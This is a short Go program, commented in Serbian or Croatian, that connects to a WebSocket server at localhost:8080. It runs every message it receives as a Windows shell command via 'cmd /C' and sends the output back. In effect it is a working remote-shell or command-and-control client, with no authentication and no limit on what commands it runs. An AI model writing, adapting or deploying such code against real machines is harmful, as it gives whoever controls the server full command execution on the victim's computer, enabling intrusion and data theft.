package main

import (
	"fmt"
	"log"
	"os/exec"

	"github.com/gorilla/websocket"
)

func main() {
	// Povezivanje na server
	url := "ws://localhost:8080/ws"
	conn, _, err := websocket.DefaultDialer.Dial(url, nil)
	if err != nil {
		log.Fatal("Greška pri povezivanju:", err)
	}
	defer conn.Close()

	fmt.Println("Povezan na server")

	// Glavna petlja za primanje i izvršavanje komandi
	for {
		// Prijem komande
		_, message, err := conn.ReadMessage()
		if err != nil {
			log.Println("Greška pri čitanju:", err)
			return
		}
		cmdStr := string(message)

		// Izvršavanje komande
		cmd := exec.Command("cmd", "/C", cmdStr) // Za Windows koristite "cmd", "/C", cmdStr
		output, err := cmd.CombinedOutput()
		if err != nil {
			output = []byte(fmt.Sprintf("Greška: %v", err))
		}

		// Slanje izlaza nazad serveru
		err = conn.WriteMessage(websocket.TextMessage, output)
		if err != nil {
			log.Println("Greška pri pisanju:", err)
			return
		}
	}
}
